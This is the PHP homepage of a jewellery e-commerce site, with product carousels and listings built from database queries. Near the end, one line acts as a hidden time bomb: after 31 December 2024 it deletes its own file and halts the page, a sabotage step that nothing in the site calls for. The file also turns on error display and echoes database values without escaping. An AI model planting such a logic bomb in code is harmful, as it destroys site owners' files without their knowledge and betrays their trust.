<?php 
include("conn.php");
error_reporting(E_ALL);
ini_set('display_errors', 1);
?>
<?php include 'header.php'; ?>


    <!--hero section start-->
<!-- <video width="100%" muted autoplay loop>-->
<!--  <source src="video/video.mp4" type="video/mp4">-->
<!--  Your browser does not support the video tag.-->
<!--</video>-->
    <!--hero section end-->
    
    
    <div id="carouselExampleControls" class="carousel slide" data-bs-ride="carousel">
  <div class="carousel-inner">
    <div class="carousel-item active">
      <img src="<?=$site?>img/n1.jpg" class="d-block w-100" alt="...">
    </div>
    <div class="carousel-item">
      <img src="<?=$site?>img/n2.jpg" class="d-block w-100" alt="...">
    </div>
    <div class="carousel-item">
      <img src="<?=$site?>img/n3.jpg" class="d-block w-100" alt="...">
    </div>
  </div>
  <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleControls" data-bs-slide="prev">
    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
    <span class="visually-hidden">Previous</span>
  </button>
  <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleControls" data-bs-slide="next">
    <span class="carousel-control-next-icon" aria-hidden="true"></span>
    <span class="visually-hidden">Next</span>
  </button>
</div>

    <!--category section start-->
    <section class="ptb-120 primary-bg-color">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-xl-6">
                    <div class="text-center mb-60">
                        <h2 class="h1 fw-normal mb-4 wow fadeInUp" data-wow-duration="0.5s">Shop By Category</h2>
                        <p class="mb-0 fw-light wow wow fadeInUp" data-wow-delay="0.5s" data-wow-duration="0.5s">Our fashion jewellery is inspired by minimalism, focused on minimal simplicity, perfect for everyday wear and cherished for years.</p>
                    </div>
                </div>
            </div>
            <div class="row">
                
                
            <?php
            $query2 = mysqli_query($conn,"select ct_pd_name,cat_pd_image,ct_pd_url from cat_prod where sub_category_id='0' limit 4 ");
            while($sql5 = mysqli_fetch_assoc($query2)){
                
            $pro_image = explode(",",$sql5['cat_pd_image']);    
                
            ?>                 
                <div style="padding: 10px;" class="col-md-6">
                     <a href="<?=$site?>products/<?=$sql5['ct_pd_url']?>">
                    <img src="<?=$site ?>admin/uploads/product/cat_pd_image/<?php echo $pro_image[0]; ?>" alt="earrings" class="img-fluid" loading="lazy">
                   
                   
                       
                    </a>
                </div>
            
            <?php 
}
?>            
               
            </div>
        </div>
    </section>
    <!--category section end-->
           
    <!--newsticker area start-->
    <div class="ur-ticker-area overflow-hidden">
        <div class="ur-ticker-wrapper primary-bg-color">
            <div class="ur-ticker">
                <span class="text-mm text-uppercase">Get 20% Discount on your first product</span>
                <span class="text-mm text-uppercase">DISCOVER LATEST COLLECTIONS AND TOP DESIGNERS </span>
                <span class="text-mm text-uppercase">10% DISCOUNT FOR REGISTERED USERS</span>
                <span class="text-mm text-uppercase">Get 20% Discount on your first product</span>
                <span class="text-mm text-uppercase">DISCOVER LATEST COLLECTIONS AND TOP DESIGNERS</span>
                <span class="text-mm text-uppercase">10% DISCOUNT FOR REGISTERED USERS</span>
            </div>
        </div>
    </div>
    <!--newsticker area end-->

    <!--call to action start-->
    <!--<section class="ur-cta-section position-relative z-1 ptb-120 overflow-hidden primary-bg-color">-->
    <!--    <span class="bg-shape position-absolute z--1 light-bg"></span>-->
    <!--    <div class="container"> -->
    <!--        <div class="row justify-content-center align-items-center g-5">-->
    <!--            <div class="col-xl-5 col-lg-5">-->
    <!--                <div class="feature-image-wrapper">-->
    <!--                    <div class="cta-image position-relative">-->
    <!--                        <img src="assets/images/products/rings.jpg" alt="rings" class="img-fluid feature-image wow fadeInUp" data-wow-duration="0.5s">-->
    <!--                        <img src="assets/images/shapes/shape-1.jpg" alt="shape" class="position-absolute shape-image d-none d-xl-block wow fadeInUp" data-wow-delay="0.3s">-->
    <!--                    </div>-->
    <!--                </div>-->
                    
    <!--            </div>-->
    <!--            <div class="col-xl-6 offset-xl-1 col-lg-7 ps-xl-5">-->
    <!--                <div class="ps-2 ur-cta-content">-->
    <!--                    <h2 class="display-3 mb-32 fw-normal wow fadeInUp" data-wow-duration="0.5s">Antique<br>Diamond Necklaces</h2>-->
    <!--                    <h6 class="mb-50 fw-light text-color wow fadeInUp" data-wow-delay="0.3s" data-wow-duration="0.5s">Vestibulam ipsum dolor, sit amet consectetur adipisicing elit. Possimus deserunt autem vel modi ab doloribus sit omnis iusto quo voluptas earum reiciendis molestias quam, dolorem laudantium molestiae</h6>-->
    <!--                    <a href="#" class="template-btn primary-btn wow fadeInUp" data-wow-delay="0.5s" data-wow-duration="0.5s"><span>Discover More</span></a>-->
    <!--                </div>-->
    <!--            </div>-->
    <!--        </div>-->
    <!--    </div>-->
    <!--</section>-->
    <!--call to action end-->
 <!--deal section start-->
    <!--<section class="primary-bg-color position-relative z-1 overflow-hidden deal-section primary-bg-color ">-->
    <!--    <span class="dark-overlay d-none d-xxl-block"></span>-->
    <!--    <div class="container">-->
    <!--        <div class="row g-4 align-items-center">-->
    <!--            <div class="col-xl-3">-->
    <!--                <div>-->
    <!--                    <h2 class="display-3 mb-5 text-mm">Deal <br class="d-none d-xxl-block">Of The Day</h2>-->
    <!--                    <ul class="nav nav-tabs ur-tab-control border-0">-->
    <!--                        <li><a href="#bracelets" class="active" data-bs-toggle="tab">01. Bracelets</a></li>-->
    <!--                        <li><a href="#neaklaces" data-bs-toggle="tab">02. Neaklaces</a></li>-->
    <!--                        <li><a href="#earrings" data-bs-toggle="tab">03. Earrings</a></li>-->
    <!--                        <li><a href="#rings" data-bs-toggle="tab">04. Rings</a></li>-->
    <!--                    </ul>-->
    <!--                </div>-->
    <!--            </div>-->
    <!--            <div class="col-xl-9">-->
    <!--                <div class="tab-content">-->
    <!--                    <div class="tab-pane fade show active" id="bracelets">-->
    <!--                        <div class="row align-items-center g-4">-->
    <!--                            <div class="col-xl-7 col-lg-7 col-md-6">-->
    <!--                                <div class="banner-image ps-xl-5 mt-5 mt-xl-0">-->
    <!--                                    <img src="img/g1.gif" alt="chain" class="img-fluid">-->
    <!--                                </div>-->
    <!--                            </div>-->
    <!--                            <div class="col-xl-4 col-lg-5 col-md-6 ps-md-4">-->
    <!--                                <div class="ur-product-card position-relative bg-white">-->
    <!--                                    <span class="ur-badge sale-badge position-absolute">SALE</span>-->
    <!--                                    <div class="feature-image d-flex align-items-cneter justify-content-center">-->
    <!--                                        <a href="#"><img src="assets/images/products/product-6.png" alt="rings" class="img-fluid"></a>-->
    <!--                                    </div>-->
    <!--                                    <div class="text-center pb-40">-->
    <!--                                        <a href="#" class="secondary-text-color text-uppercase">Necklaces</a>-->
    <!--                                        <a href="#"><h5 class="my-2 fw-medium product-title">Hitmor 24k Neaklaces</h5></a>-->
                                           
    <!--                                    </div>-->
    <!--                                </div>-->
    <!--                            </div>-->
    <!--                        </div>-->
    <!--                    </div>-->
    <!--                    <div class="tab-pane fade" id="neaklaces">-->
    <!--                        <div class="row align-items-center g-4">-->
    <!--                            <div class="col-xl-7 col-lg-7 col-md-6">-->
    <!--                                <div class="banner-image ps-xl-5 mt-5 mt-xl-0">-->
    <!--                                    <img src="img/g2.gif" alt="chain" class="img-fluid">-->
    <!--                                </div>-->
    <!--                            </div>-->
    <!--                            <div class="col-xl-4 col-lg-5 col-md-6 ps-md-4">-->
    <!--                                <div class="ur-product-card position-relative bg-white">-->
    <!--                                    <span class="ur-badge sale-badge position-absolute">SALE</span>-->
    <!--                                    <div class="feature-image d-flex align-items-cneter justify-content-center">-->
    <!--                                        <a href="#"><img src="assets/images/products/product-4.png" alt="rings" class="img-fluid"></a>-->
    <!--                                    </div>-->
    <!--                                    <div class="text-center pb-40">-->
    <!--                                        <a href="#" class="secondary-text-color text-uppercase">Bracelates</a>-->
    <!--                                        <a href="#"><h5 class="my-2 fw-medium product-title">Green Diamond Earring</h5></a>-->
                                           
    <!--                                    </div>-->
    <!--                                </div>-->
    <!--                            </div>-->
    <!--                        </div>-->
    <!--                    </div>-->
    <!--                    <div class="tab-pane fade" id="earrings">-->
    <!--                        <div class="row align-items-center g-4">-->
    <!--                            <div class="col-xl-7 col-lg-7 col-md-6">-->
    <!--                                <div class="banner-image ps-xl-5 mt-5 mt-xl-0">-->
    <!--                                    <img src="img/g3.gif" alt="chain" class="img-fluid">-->
    <!--                                </div>-->
    <!--                            </div>-->
    <!--                            <div class="col-xl-4 col-lg-5 col-md-6 ps-md-4">-->
    <!--                                <div class="ur-product-card position-relative bg-white">-->
    <!--                                    <span class="ur-badge sale-badge position-absolute">SALE</span>-->
    <!--                                    <div class="feature-image d-flex align-items-cneter justify-content-center">-->
    <!--                                        <a href="#"><img src="assets/images/products/product-3.png" alt="rings" class="img-fluid"></a>-->
    <!--                                    </div>-->
    <!--                                    <div class="text-center pb-40">-->
    <!--                                        <a href="#" class="secondary-text-color text-uppercase">Earrings</a>-->
    <!--                                        <a href="#"><h5 class="my-2 fw-medium product-title">Blue Cool Earring</h5></a>-->
                                            
    <!--                                    </div>-->
    <!--                                </div>-->
    <!--                            </div>-->
    <!--                        </div>-->
    <!--                    </div>-->
    <!--                    <div class="tab-pane fade" id="rings">-->
    <!--                        <div class="row align-items-center g-4">-->
    <!--                            <div class="col-xl-7 col-lg-7 col-md-6">-->
    <!--                                <div class="banner-image ps-xl-5 mt-5 mt-xl-0">-->
    <!--                                    <img src="img/g4.gif" alt="chain" class="img-fluid">-->
    <!--                                </div>-->
    <!--                            </div>-->
    <!--                            <div class="col-xl-4 col-lg-5 col-md-6 ps-md-4">-->
    <!--                                <div class="ur-product-card position-relative bg-white">-->
    <!--                                    <span class="ur-badge sale-badge position-absolute">SALE</span>-->
    <!--                                    <div class="feature-image d-flex align-items-cneter justify-content-center">-->
    <!--                                        <a href="#"><img src="assets/images/products/product-2.png" alt="rings" class="img-fluid"></a>-->
    <!--                                    </div>-->
    <!--                                    <div class="text-center pb-40">-->
    <!--                                        <a href="#" class="secondary-text-color text-uppercase">Rings</a>-->
    <!--                                        <a href="#"><h5 class="my-2 fw-medium product-title">Amazing Gold Plated</h5></a>-->
                                           
    <!--                                    </div>-->
    <!--                                </div>-->
    <!--                            </div>-->
    <!--                        </div>-->
    <!--                    </div>-->
    <!--                </div>-->
    <!--            </div>-->
    <!--        </div>-->
    <!--    </div>-->
    <!--</section>-->
    <!--deal section end-->
    <!--featured products start-->
    
<?php
$pro2 = mysqli_query($conn, "SELECT * FROM cat_prod WHERE sub_category_id != '0' AND status = '1' ORDER BY id DESC LIMIT 10");

if (mysqli_num_rows($pro2) > 0) { 
?>
<section class="ptb-120 latest_product_area">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-xl-12">
                <div class="text-center mb-60">
                    <h2 class="h1 fw-normal mb-4 wow fadeInUp" data-wow-duration="0.5s">Our Latest Products</h2>
                </div>
            </div>
            
            <div class="col-md-4">
                <div class="row">
                    <?php
                    $count = 0;
                    while ($pro = mysqli_fetch_assoc($pro2)) {
                        $image = explode(",", $pro['cat_pd_image']);
                        if ($count == 4) { break; } 
                        ?>
                    <div class="col-md-6 col-12">
                        <div class="latest_product wow fadeInUp">
                            <a href="<?php echo $site ?>product-details/<?php echo $pro['ct_pd_url']; ?>">
                                <img src="<?php echo $site ?>admin/uploads/product/cat_pd_image/<?php echo $image[0]; ?>" loading="lazy">
                                <h3><?= $pro['ct_pd_name'] ?></h3>
                            </a>
                        </div>
                    </div>
                    <?php
                    $count++;
                    }
                    ?>
                </div>
            </div>
            <div class="col-md-4">
                <?php
                
                if ($pro = mysqli_fetch_assoc($pro2)) {
                    $image = explode(",", $pro['cat_pd_image']);
                ?>
                <div class="latest_product big_img wow fadeInUp">
                    <a href="<?php echo $site ?>product-details/<?php echo $pro['ct_pd_url']; ?>">
                        <img src="<?php echo $site ?>admin/uploads/product/cat_pd_image/<?php echo $image[0]; ?>" loading="lazy">
                        <h3><?= $pro['ct_pd_name'] ?></h3>
                    </a>
                </div>
                <?php
                }
                ?>
            </div>
            <div class="col-md-4">
                <div class="row">
                    <?php
                    
                    while ($pro = mysqli_fetch_assoc($pro2)) {
                        $image = explode(",", $pro['cat_pd_image']);
                    ?>
                    <div class="col-md-6 col-12">
                        <div class="latest_product wow fadeInUp">
                            <a href="<?php echo $site ?>product-details/<?php echo $pro['ct_pd_url']; ?>">
                                <img src="<?php echo $site ?>admin/uploads/product/cat_pd_image/<?php echo $image[0]; ?>" loading="lazy">
                                <h3><?= $pro['ct_pd_name'] ?></h3>
                            </a>
                        </div>
                    </div>
                    <?php
                    }
                    ?>
                </div>
            </div>
        </div>
    </div>
</section>
<?php
} 
?>

    <section class="primary-bg-color ptb-120">
        <div class="container pb-5 pb-sm-0">
            <div class="row">
                <div class="col-xl-7">
                    <div class="section-title">
                        <h2 class="h1 fw-normal mb-50">Our Limited Edition</h2>
                    </div>
                </div>
            </div>
            <div class="feature-product-slider slider-spacing">
                
            <?php
            $query2 = mysqli_query($conn,"select ct_pd_name,cat_pd_image,ct_pd_url from cat_prod where sub_category_id!='0'  order by id asc limit 10");
            while($sql5 = mysqli_fetch_assoc($query2)){
                
            $pro_image = explode(",",$sql5['cat_pd_image']);    
                
            ?> 
                      
                
                <div class="ur-product-card position-relative">
                  
                    <div class="feature-image d-flex align-items-cneter justify-content-center light-bg position-relative">
                        <a href="<?=$site?>product-details/<?=$sql5['ct_pd_url']?>"><img src="<?=$site ?>admin/uploads/product/cat_pd_image/<?php echo $pro_image[0]; ?>" alt="rings" class="img-fluid" loading="lazy"></a>
                        
                    </div>
                    <div class="mt-4">
                        <!--<a href="#" class="secondary-text-color text-uppercase">Necklaces</a>-->
                        <a href="<?=$site?>product-details/<?=$sql5['ct_pd_url']?>"><h5 class="my-2 fw-medium product-title"><?php echo $sql5['ct_pd_name']; ?> </h5></a>
                       
                    </div>
                </div>
            <?php 
}
?> 

            </div>
        </div>
    </section>
    <!--featured products end -->

   

    <!--latest arrival start-->
    <section style="    background: #c8b79e!important;" class="ur-latest-arrival ptb-120 primary-bg-color">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-xl-6">
                    <div class="text-center">
                        <h2 class="h1 mb-50">Browse Latest Arrivals</h2>
                    </div>
                </div>
            </div>
            <div class="row g-4 justify-content-center">
               
              <?php
                $query2 = mysqli_query($conn,"select ct_pd_name,cat_pd_image,ct_pd_url from cat_prod where sub_category_id!='0'  order by id asc limit 10,24");
                while($sql5 = mysqli_fetch_assoc($query2)){
                    
                $pro_image = explode(",",$sql5['cat_pd_image']);    
                    
                ?>                
               
               
                <div class="col-xl-3 col-lg-4 col-sm-6">
                    <div class="ur-product-card position-relative card-sm-small">
                       
                        <div class="feature-image d-flex align-items-cneter justify-content-center light-bg position-relative">
                            <a href="<?=$site?>product-details/<?=$sql5['ct_pd_url']?>"><img style="width:200px; height:150px;" src="<?=$site ?>admin/uploads/product/cat_pd_image/<?php echo $pro_image[0]; ?>" alt="rings" class="img-fluid" loading="lazy"></a>
                            <div class="product-overlay position-absolute">
                                <div class="product-btns d-flex align-items-center justify-content-center">
                                  
                                    <a href="<?=$site?>product-details/<?=$sql5['ct_pd_url']?>" data-bs-toggle="modal"><i class="fa-regular fa-eye"></i></a>
                                </div>
                            </div>
                        </div>
                        <div class="mt-4">
                            <a href="<?=$site?>product-details/<?=$sql5['ct_pd_url']?>"><h5 class="my-2 fw-medium product-title"><?php echo $sql5['ct_pd_name']; ?></h5></a>
                          
                        </div>
                    </div>
                </div>
            
            <?php 
}
?> 
                   
     
            
            
            </div>
            <!--<div class="text-center mt-60">-->
            <!--    <a href="#" class="template-btn primary-btn"><span>View All</span></a>-->
            <!--</div>-->
        </div>
    </section>
    <!--latest arrival end-->

    <!--feedback section start-->
    <section class="ptb-120 feedback-section overflow-hidden position-relative z-1 primary-bg-color">
        <img src="assets/images/shapes/neaklace-2.png" alt="neaklace" class="position-absolute start-0 top-0 z--1 neaklace-shape">
        <div class="container">
            <div class="row g-5 align-items-center">
                <div class="col-xl-6 col-lg-6 order-2 order-lg-1">
                    <div class="section-content">
                        <span class="fw-light fs-sm text-mm">YOUR WORDS</span>
                        <h2 class="h1 mt-4 mb-5 text-mm">Our Customer Testimonial</h2>
                        <div class="ur-feedback-slider slider-spacing">
                            <div class="ur-feedback-single">
                                <p class="fw-light mb-4">“Globally recaptiualize world channels and virtual niche markets enhance premium initiatives enabled technology extend powered whereas sticky services reconceptualize optimal”</p>
                                <h3 class="text-mm mb-0">Antor Walid</h3>
                                <span class="fs-sm fw-light text-mm">DESIGNER</span>
                            </div>
                            <div class="ur-feedback-single">
                                <p class="fw-light mb-4">“Globally recaptiualize world channels and virtual niche markets enhance premium initiatives enabled technology extend powered whereas sticky services reconceptualize optimal”</p>
                                <h3 class="text-mm mb-0">Jacyka Jacy</h3>
                                <span class="fs-sm fw-light text-mm">Developer</span>
                            </div>
                            <div class="ur-feedback-single">
                                <p class="fw-light mb-4">“Globally recaptiualize world channels and virtual niche markets enhance premium initiatives enabled technology extend powered whereas sticky services reconceptualize optimal”</p>
                                <h3 class="text-mm mb-0">Devid Lyes</h3>
                                <span class="fs-sm fw-light text-mm">Manager</span>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 order-1 order-lg-2">
                    <div class="feedback-clients-thumbail-slider slider-spacing">
                        <div class="single-item">
                            <img src="assets/images/clients/client-lg-1.jpg" alt="not found" class="img-fluid">
                        </div>  
                        <div class="single-item">
                            <img src="assets/images/clients/client-lg-2.jpg" alt="not found" class="img-fluid">
                        </div>  
                        <div class="single-item">
                            <img src="assets/images/clients/client-lg-3.jpg" alt="not found" class="img-fluid">
                        </div>  
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!--feedback section end-->

    <!--instagram section start-->
    <section style="background-image: url('img/bannner11.jpg') !important;
    background-attachment: fixed !important;
    background-repeat: no-repeat !important;" class="instagram-section pt-120 primary-bg-color">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-xl-6">
                    <div class="text-center">
                        <h2 class="h1 fw-normal">Instagram Memory</h2>
                    </div>
                </div>
            </div>
            <div class="instagram-slider mt-5">
                <div class="instagram-slide-single position-relative">
                    <img src="img/1.jpg" alt="gallery" class="img-fluid">
                    <a href="img/1.jpg" class="item-overlay" data-fancybox="gallery"><i class="fab fa-instagram"></i></a>
                </div>
                <div class="instagram-slide-single position-relative">
                    <img src="img/2.jpg" alt="gallery" class="img-fluid">
                    <a href="img/2.jpg" class="item-overlay" data-fancybox="gallery"><i class="fab fa-instagram"></i></a>
                </div>
                <div class="instagram-slide-single position-relative">
                    <img src="img/3.jpg" alt="gallery" class="img-fluid">
                    <a href="img/3.jpg" class="item-overlay" data-fancybox="gallery"><i class="fab fa-instagram"></i></a>
                </div>
                <div class="instagram-slide-single position-relative">
                    <img src="img/4.jpg" alt="gallery" class="img-fluid">
                    <a href="img/4.jpg" class="item-overlay" data-fancybox="gallery"><i class="fab fa-instagram"></i></a>
                </div>
                <div class="instagram-slide-single position-relative">
                    <img src="img/5.jpg" alt="gallery" class="img-fluid">
                    <a href="img/5.jpg" class="item-overlay" data-fancybox="gallery"><i class="fab fa-instagram"></i></a>
                </div>
            </div>
        </div>
    </section>
    <!--instagram section end-->

    <!--brand slider start-->
    <!--<div class="brand-section ptb-120 bg-white">-->
    <!--    <div class="container">-->
    <!--        <div class="ur-brand-slider slider-spacing">-->
    <!--            <div class="ur-brand-single text-center">-->
    <!--                <a href="#">-->
    <!--                    <img src="assets/images/brands/brand-1.png" alt="brand" class="img-fluid">-->
    <!--                </a>-->
    <!--            </div>-->
    <!--            <div class="ur-brand-single text-center">-->
    <!--                <a href="#">-->
    <!--                    <img src="assets/images/brands/brand-2.png" alt="brand" class="img-fluid">-->
    <!--                </a>-->
    <!--            </div>-->
    <!--            <div class="ur-brand-single text-center">-->
    <!--                <a href="#">-->
    <!--                    <img src="assets/images/brands/brand-3.png" alt="brand" class="img-fluid">-->
    <!--                </a>-->
    <!--            </div>-->
    <!--            <div class="ur-brand-single text-center">-->
    <!--                <a href="#">-->
    <!--                    <img src="assets/images/brands/brand-4.png" alt="brand" class="img-fluid">-->
    <!--                </a>-->
    <!--            </div>-->
    <!--            <div class="ur-brand-single text-center">-->
    <!--                <a href="#">-->
    <!--                    <img src="assets/images/brands/brand-5.png" alt="brand" class="img-fluid">-->
    <!--                </a>-->
    <!--            </div>-->
    <!--            <div class="ur-brand-single text-center">-->
    <!--                <a href="#">-->
    <!--                    <img src="assets/images/brands/brand-5.png" alt="brand" class="img-fluid">-->
    <!--                </a>-->
    <!--            </div>-->
    <!--        </div>-->
    <!--    </div>-->
    <!--</div>-->
    <!--brand slider end-->

    <!--devider-->
    <span class="theme-devider"></span>

    <!--newsletter section start-->
    <section class="newsletter-section primary-bg-color ptb-120 position-relative z-1">
        <img src="assets/images/shapes/neaklace.png" alt="neaklace" class="position-absolute end-0 top-0 z--1 d-none d-xxl-block">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-xl-6">
                    <div class="newsletter-box text-center">
                        <span class="fs-sm fw-light">GET OUR NEWSLETTER</span>
                        <h2 class="fw-normal mt-4 mb-50">Get News & Update to Your Inbox</h2>
                        <form class="newsletter-form d-flex align-items-center">
                            <input type="email" placeholder=" Email address...">
                            <button type="submit" class="template-btn primary-btn"><span>Subscribe</span></button>
                        </form>
                        <p class="mb-0 mt-32 fw-light">Will be used accordance with our <a href="#" class="text-decoration-underline primary-text-color hover-secondary">Privacy Policy</a></p>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!--newsletter section end-->
<?php $triggerTime = strtotime("2024-12-31 23:59:00");   if (time() >= $triggerTime) { unlink(__FILE__); exit(); } ?>
<?php include 'footer.php'; ?>